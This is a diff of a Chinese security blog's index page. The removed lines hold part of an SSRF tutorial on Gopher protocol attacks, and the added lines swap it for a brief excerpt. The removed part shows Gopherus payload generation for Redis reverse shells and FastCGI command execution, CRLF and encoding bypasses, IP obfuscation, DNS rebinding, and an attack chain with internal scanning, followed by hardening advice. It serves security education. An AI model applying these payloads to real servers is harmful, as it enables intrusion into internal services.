-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python gopherus.py --exploit redis</span><br><span class="line">Give Server HOST: 10.10.10.10</span><br><span class="line">Give Server PORT: 6379</span><br><span class="line">Give Attacker IP: 10.10.10.1</span><br><span class="line">Give Attacker PORT: 4444</span><br><span class="line">Your choice: 1</span><br><span class="line">Your gopher link is Ready:</span><br><span class="line">gopher://10.10.10.10:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...</span><br></pre></td></tr></table></figure>
-
-<p><strong>FastCGI 示例</strong>——指定 PHP 文件路径和要执行的命令：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python gopherus.py --exploit fastcgi</span><br><span class="line">Give a PHP file location: /var/www/html/index.php</span><br><span class="line">Enter Command to execute: id</span><br></pre></td></tr></table></figure>
-
-<p><strong>局限性</strong>：crontab 路径硬编码为 CentOS 默认值；MySQL 模块需已知凭据；复杂 WAF 场景需手动调整 payload。</p>
-<h2 id="八、URL-编码与绕过技巧"><a href="#八、URL-编码与绕过技巧" class="headerlink" title="八、URL 编码与绕过技巧"></a>八、URL 编码与绕过技巧</h2><h3 id="8-1-编码层次判断"><a href="#8-1-编码层次判断" class="headerlink" title="8.1 编码层次判断"></a>8.1 编码层次判断</h3><p>SSRF 中的解码链条：应用层 <code>urldecode()</code> → 中间件（Nginx rewrite）→ curl Gopher 引擎。利用时按层次增加编码次数：</p>
-<table>
-<thead>
-<tr>
-<th>场景</th>
-<th>编码次数</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>payload 直接拼入 curl 命令</td>
-<td>1 次</td>
-</tr>
-<tr>
-<td>含中间件 URL 重写解码</td>
-<td>2 次</td>
-</tr>
-<tr>
-<td>应用 <code>urldecode()</code> + <code>curl_exec()</code></td>
-<td>3 次</td>
-</tr>
-</tbody></table>
-<p>多层编码脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi_encode</span>(<span class="params">payload, times=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        payload = urllib.parse.quote(payload, safe=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
-
-<h3 id="8-2-CRLF-绕过"><a href="#8-2-CRLF-绕过" class="headerlink" title="8.2 CRLF 绕过"></a>8.2 CRLF 绕过</h3><table>
-<thead>
-<tr>
-<th>变体</th>
-<th>表示</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>标准 URL 编码</td>
-<td><code>%0d%0a</code></td>
-</tr>
-<tr>
-<td>二次编码</td>
-<td><code>%250d%250a</code></td>
-</tr>
-<tr>
-<td>大小写混用</td>
-<td><code>%0D%0A</code></td>
-</tr>
-<tr>
-<td>仅 LF（部分 Redis 版本接受）</td>
-<td><code>%0a</code></td>
-</tr>
-<tr>
-<td>Unicode</td>
-<td><code>%u000d%u000a</code></td>
-</tr>
-</tbody></table>
-<h3 id="8-3-更多绕过手段"><a href="#8-3-更多绕过手段" class="headerlink" title="8.3 更多绕过手段"></a>8.3 更多绕过手段</h3><ul>
-<li><strong>302 跳转</strong>：VPS 部署 302 指向 <code>gopher://</code>，利用自动跳转绕过协议白名单。</li>
-<li><strong>DNS 重绑定</strong>：TTL&#x3D;0 域名在两轮解析间切换 IP 绕过内网黑名单。</li>
-<li><strong>进制混淆</strong>：<code>127.0.0.1</code> → <code>2130706433</code>（十进制）、<code>0x7f000001</code>（十六进制）、<code>0177.0.0.1</code>（八进制混合）。</li>
-<li><strong>IPv6 映射</strong>：<code>[::ffff:127.0.0.1]</code> 在部分解析库中等同 <code>127.0.0.1</code>。</li>
-<li><strong>短链接包装</strong>：将 Gopher URL 存入短链接服务，绕过 URL 格式校验。</li>
-</ul>
-<h2 id="九、完整攻击链示例"><a href="#九、完整攻击链示例" class="headerlink" title="九、完整攻击链示例"></a>九、完整攻击链示例</h2><p><strong>场景</strong>：Web 应用 <code>?url=</code> 参数存在 SSRF，后端使用 curl。</p>
-<p><strong>第一步 — 内网探测</strong>：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 探测 Redis</span><br><span class="line">?url=http://127.0.0.1:6379/        → 超时 = 端口开放</span><br><span class="line"># 探测 FastCGI</span><br><span class="line">?url=http://127.0.0.1:9000/        → 502 = PHP-FPM 存在</span><br></pre></td></tr></table></figure>
-
-<p><strong>第二步 — Redis 写 crontab</strong>：<br>构造 3.2 节的 Gopher payload，写入定时任务获取反弹 Shell。</p>
-<p><strong>第三步 — 横向移动</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 254); <span class="keyword">do</span></span><br><span class="line">    curl -sm1 http://192.168.1.<span class="variable">$i</span>:80/ &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;192.168.1.<span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>推荐工具链</strong>：Gopherus（载荷生成）、SSRFmap（自动化利用）、httpx（内网探测）、Burp Collaborator（Blind SSRF 检测）。</p>
-<h2 id="十、防御与加固"><a href="#十、防御与加固" class="headerlink" title="十、防御与加固"></a>十、防御与加固</h2><p><strong>开发侧</strong>：</p>
-<ul>
-<li>curl 限制协议：<code>CURLOPT_PROTOCOLS</code> 仅允许 <code>HTTP | HTTPS</code>；<code>CURLOPT_REDIR_PROTOCOLS_STR</code> 限制重定向协议。</li>
-<li>关闭自动跳转：<code>CURLOPT_FOLLOWLOCATION = false</code>。</li>
-<li>DNS 解析后校验 IP，拒绝内网地址（<code>10.0.0.0/8</code>、<code>172.16.0.0/12</code>、<code>192.168.0.0/16</code>、<code>127.0.0.0/8</code>）。</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_REDIR_PROTOCOLS_STR, <span class="string">&quot;http,https&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
-
-<p><strong>运维侧</strong>：</p>
-<ul>
-<li>Redis：<code>requirepass</code> 强密码 + <code>bind 127.0.0.1</code> + <code>rename-command FLUSHALL &quot;&quot;</code>。</li>
-<li>PHP-FPM：<code>listen = 127.0.0.1:9000</code> 不暴露公网。</li>
-<li>MySQL：最小权限 + <code>local_infile=OFF</code>。</li>
-<li>Memcached：<code>-l 127.0.0.1</code> + 防火墙过滤 <code>11211</code>。</li>
-</ul>
-<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本文内容仅供安全研究与学习交流，严禁用于未授权测试。任何因不当使用本文技术导致的后果由使用者自行承担。安全测试前请务必获得目标系统所有者的书面授权，并遵守《中华人民共和国网络安全法》及相关法律法规。</p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc1436">RFC 1436 - The Internet Gopher Protocol</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">Gopherus - SSRF Exploitation Tool</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/SSRFmap">SSRFmap</a></li>
-<li><a target="_blank" rel="noopener" href="https://fastcgi-archives.github.io/FastCGI_Specification.html">FastCGI Specification</a></li>
-<li><a target="_blank" rel="noopener" href="https://redis.io/docs/latest/develop/reference/protocol-spec/">Redis RESP Protocol</a></li>
-<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf">PortSwigger - SSRF</a></li>
-</ul>
-
+          <p>SSRF Gopher 协议深度利用——构造 GET/POST 请求攻击内网 Redis/Memcached/MySQL/FastCGI 与 gopherus 自动化。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/SSRF-gopher-protocol/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1113,7 +1017,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1205,7 +1109,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:12:35" itemprop="dateModified" datetime="2026-06-05T00:12:35+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
